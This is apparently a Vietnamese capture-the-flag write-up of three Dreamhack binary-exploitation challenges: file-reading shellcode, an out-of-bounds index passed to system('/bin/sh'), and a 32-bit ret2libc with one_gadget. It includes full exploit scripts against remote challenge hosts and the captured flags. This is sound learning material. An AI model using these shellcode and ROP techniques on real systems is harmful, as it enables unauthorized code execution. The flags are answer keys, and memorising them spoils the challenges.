# shell_basic

## Ý tưởng

Theo đề bài là ta sẽ phải tạo một shellcode để lấy flag ở `/home/shell_basic/flag_name_is_loooooong` thì chúng ta cần các như: syscall_open (để mở file), syscall_read (để đọc dữ liệu), syscall_write (để ghi ra màn hình) và exit

## Thực thi

- Khi tham khảo các wu em thấy có khái niệm opcode, được hiểu mơ hồ là một loại mã cho máy biết phải làm gì, tức là phải thực hiện thao tác nào. Opcode là một loại hướng dẫn ngôn ngữ máy.
- asm của nó là `push 0`

### syscall_open

![image](https://user-images.githubusercontent.com/111769169/226924551-6462ae35-9e2e-411e-b527-31af3f71d8fb.png)

- rdi: địa chỉ file `/home/shell_basic/flag_name_is_loooooong`
- rsi = 0
- rdx = 0

Đầu tiên ta sẽ push đường dẫn file flag vào stack

```asm
    push 1
    mov rax, 0x676E6F6F6F6F6F6F         ;"oooooong"
    push rax
    mov rax, 0x6C5F73695F656D61         ;'ame_is_l'
    push rax
    mov rax, 0x6E5F67616C662F63         ; 'c/flag_n'
    push rax
    mov rax, 0x697361625f6c6c65         ; 'ell_basi'
    push rax
    mov rax, 0x68732f656d6f682f         ; '/home/sh'
    push rax
```

Sau đó ta sẽ setup các thanh ghi sao cho

- rax = 0x2
- rdi = `/home/shell_basic/flag_name_is_loooooong`
- rsi = 0 (RD_ONLY)
- rdx = 0

```asm
    ;set sys_open
    mov rax, 0x2
    mov rdi, rsp                        ; RD_only
    xor rsi, rsi
    xor rdx, rdx
    syscall
```

### sys_read

![image](https://user-images.githubusercontent.com/111769169/226928405-d4f75f67-4b87-4388-8361-83ade81bed20.png)
Ta sẽ setup:

- rax : 0x00
- rdi : là đặc tả file (fd)
- rsi : buf
- rdx : len

```asm
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x30                       ; rsi = rsp - 0x30, buf
    mov rdx, 0x30                       ; rdx = 0x30, len
    mov rax, 0x0                        ; rax = 0
    syscall
```

### sys_write

![image](https://user-images.githubusercontent.com/111769169/226931783-591deeef-3e02-4fe8-a90f-152f4f0109df.png)
Ta cần setup các thanh ghi:

- rax : 0x01
- rdi : fd
- rsi : buf
- rdx : len

```asm
    mov rax, 0x1
    mov rdi, 1      ; fd = stdout
    syscall
```

sau đó ta dùng tool [link](https://defuse.ca/) để đổi asm thành mã máy
`\x6a\x00\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6E\x67\x50\x48\xB8\x61\x6D\x65\x5F\x69\x73\x5F\x6C\x50\x48\xB8\x63\x2F\x66\x6C\x61\x67\x5F\x6E\x50\x48\xB8\x65\x6C\x6C\x5F\x62\x61\x73\x69\x50\x48\xB8\x2F\x68\x6F\x6D\x65\x2F\x73\x68\x50\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\x83\xEE\x30\x48\xC7\xC2\x30\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x0F\x05`

<details> <summary> script asm </summary>

```asm
    push 0x0
    mov rax, 0x676E6F6F6F6F6F6F         ;"oooooong"
    push rax
    mov rax, 0x6C5F73695F656D61         ;'ame_is_l'
    push rax
    mov rax, 0x6E5F67616C662F63         ; 'c/flag_n'
    push rax
    mov rax, 0x697361625f6c6c65         ; 'ell_basi'
    push rax
    mov rax, 0x68732f656d6f682f         ; '/home/sh'
    push rax

    ;set sys_open
    mov rax, 0x2
    mov rdi, rsp                        ; RD_only
    xor rsi, rsi
    xor rdx, rdx
    syscall

    ;set sys_read
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x30                       ; rsi = rsp - 0x30, buf
    mov rdx, 0x30                       ; rdx = 0x30, len
    mov rax, 0x0                        ; rax = 0
    syscall

    mov rax, 0x1
    mov rdi, 1      ; fd = stdout
    syscall
```

</details>

---

# out_of_bound

## source

<details> <summary> source C </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char \*command[10] = { "cat",
"ls",
"id",
"ps",
"file ./oob" };
void alarm_handler()
{
puts("TIME OUT");
exit(-1);
}

void initialize()
{
setvbuf(stdin, NULL, \_IONBF, 0);
setvbuf(stdout, NULL, \_IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);

}

int main()
{
int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;

}
```

</details>

## Ý tưởng

- Ở đây, ta chú ý đoạn code này, ở đây chúng ta nhận `idx` là 0, 1, 2 để thông qua system thực hiện các lệnh ls, id, ...
- Tuy vậy ta hoàn toàn có thể truy cập các giá trị ngoài mảng `command`

```c
    char \*command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };

    scanf("%d", &idx);

    system(command[idx]);
```

- Thông qua ida ta kiểm được địa chỉ mảng `command` và mảng `name`, và khi trừ thì ta thấy mảng `command` được khai báo trước mảng `name`

```
>>> name = 0x804A0AC
>>> command = 0x804A060
```

- Đến đây, ta có thể đoán được ta sẽ truyền chuỗi `/bin/sh` vào `name`, sau đó ta nhập vào giá trị `idx` tại chuỗi `/bin/sh`

## Thực thi

- Đầu tiên ta sẽ tìm giá trị `idx`

```
>>> name - command
76
>>> 76/4
19.0
```

- Vậy tại vị trí `command[19]` ta sẽ truyền vào chuỗi `/bin/sh` vào main và chạy thử, và lỗi =))

```
Admin name: /bin/sh
What do you want?: 19
```

- Ta thử gdb và dừng ngay hàm system

![image](https://user-images.githubusercontent.com/111769169/227205825-b4c943fb-7028-43a2-9bdd-1d9657a7d41a.png)

- Ở đây system chỉ thực hiện chuỗi `/bin`, để chắc chắc ta sẽ kiểm tra ida và kết quả là: `system((&command)[v4[0]]);`

- Vậy ta sẽ truyền `v4[0]` là địa chỉ của chuỗi `/bin/sh`,để khi thực hiện system, chương trình lấy chuỗi `/bin/sh`

- Do file 32bit mà cuỗi `/bin/sh` có 7 byte nên em thêm byte null vào cuối chuỗi tránh bị lỗi, nối chuỗi /bin/sh vào các chuỗi khác
<details> <summary> script </summary>

```python
from pwn import *

from pwn import *

exe = ELF("./out_of_bound")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 18672)
name = 0x804A0AC + 4
payload = p32(name) + b"/bin/sh\0"

r.sendlineafter(b"name: ", payload)
r.sendlineafter(b"want?: ", b"19")

r.interactive()
# DH{2524e20ddeee45f11c8eb91804d57296}
```

</details>

abc

---

# basic_rop_x86

## source

<details> <summary> source C </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

</details>

## Ý tưởng

- Ở đây chúng ta không có hàm tạo system() cùng với đề bài chúng ta sẽ phải ret2libc nhưng với bản 32bit
- Ở bản 32 bit việc ret2libc khá là khác so với 64bit, ban đầu em chưa thấy sự khác nhau nhưng sau một khoảng thời gian, em đọc wu về các bài ret2libc 32bit thì em thấy để leak được libc ta sẽ làm như sau:

```
payload = [140 bytes buffer] + [puts@plt] + [main()] + [puts@got]
```

## Khai thác

### Bước 1: ta cần leak được địa chỉ libc, tính base libc

- Để leak được base libc ta sẽ làm như `payload = [140 bytes buffer] + [puts@plt] + [main()] + [puts@got]` chỉ khác ở bao nhiêu byte buffer, ở đây em tính được 0x48 byte thì ow được saved rbp

```python
    pop_ebp = 0x0804868b            # em dung ROPgadget de lay pop ebp

    payload = b"A"*0x48
    payload += p32(exe.plt['puts'])
    payload += p32(pop_ebp)
    payload += p32(exe.got['puts'])
    payload += p32(exe.sym['main'])
    r.send(payload)
```

- Khi này ta leak được khoảng 4 địa chỉ
  ![image](https://user-images.githubusercontent.com/111769169/227420546-a1953367-c8cf-490f-98b5-a8c6698d24ed.png)
- Đến đây, ta sẽ unpack và ghi ra màn hình để kiểm tra

```python
r.recvuntil(b"A"*64)
leak1 = u32(r.recv(4))
leak2 = u32(r.recv(4))
leak3 = u32(r.recv(4))
leak4 = u32(r.recv(4))

log.info("leak 1 " + hex(leak1))
log.info("leak 2 " + hex(leak2))
log.info("leak 3 " + hex(leak3))
log.info("leak 4 " + hex(leak4))
```

- Ta nhận được như hình, ta có thể nhận giá trị leak 1, 3, 4 để tính base libc, ở đây e chọn leak 1 để tính base libc

![image](https://user-images.githubusercontent.com/111769169/227421250-dad69508-910b-486d-9019-b4ad26384b7f.png)

```python
r.recvuntil(b"A"*64)
leak1 = u32(r.recv(4))
leak2 = u32(r.recv(4))
leak3 = u32(r.recv(4))
leak4 = u32(r.recv(4))
libc.address = leak1 - 389440

log.info("leak 1 " + hex(leak1))
log.info("leak 2 " + hex(leak2))
log.info("leak 3 " + hex(leak3))
log.info("leak 4 " + hex(leak4))
log.info("base libc " + hex(libc.address))
```

- Kiểm tra lại, thấy đuôi 000 chắc là đúng rồi =)))

![image](https://user-images.githubusercontent.com/111769169/227422644-f52f900e-d1a7-4163-911a-eb9d438420e5.png)

### Bước 2: One_gadget

- Ở đây ta sử dụng one_gadget để tạo shell, sau khi kiểm tra em thấy shell thứ 3 thoả điều kiện nên em lấy lun

![image](https://user-images.githubusercontent.com/111769169/227423024-73a0112c-f9ae-40b9-ba57-8e5ff5efd305.png)

```python
one_gadget = libc.address + 0x3a812
payload2 = b"a" * 0x48 + p32(one_gadget)
r.send(payload2)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227423486-a01ff46e-eb64-43cf-9e1c-1498e22b0a5b.png)

<details> <summary> full script </summary>

```python
from pwn import *
libc = ELF("./libc.so.6")
exe = ELF("./basic_rop_x86_patched")
r = remote("host3.dreamhack.games", 16535)
# r = process(exe.path)
# gdb.attach(r, gdbscript='''
#            b*main+45
#            c
#            ''')
input()
pop_ebp = 0x0804868b

payload = b"A"*0x48
payload += p32(exe.plt['puts'])
payload += p32(pop_ebp)
payload += p32(exe.got['puts'])
payload += p32(exe.sym['main'])
r.send(payload)

r.recvuntil(b"A"*64)
leak1 = u32(r.recv(4))
leak2 = u32(r.recv(4))
leak3 = u32(r.recv(4))
leak4 = u32(r.recv(4))
libc.address = leak1 - 389440

log.info("leak 1 " + hex(leak1))
log.info("leak 2 " + hex(leak2))
log.info("leak 3 " + hex(leak3))
log.info("leak 4 " + hex(leak4))
log.info("base libc " + hex(libc.address))

one_gadget = libc.address + 0x3a812
payload2 = b"a" * 0x48 + p32(one_gadget)
r.send(payload2)

r.interactive()

# DH{ff3976e1fcdb03267e8d1451e56b90a5}

```

</details>
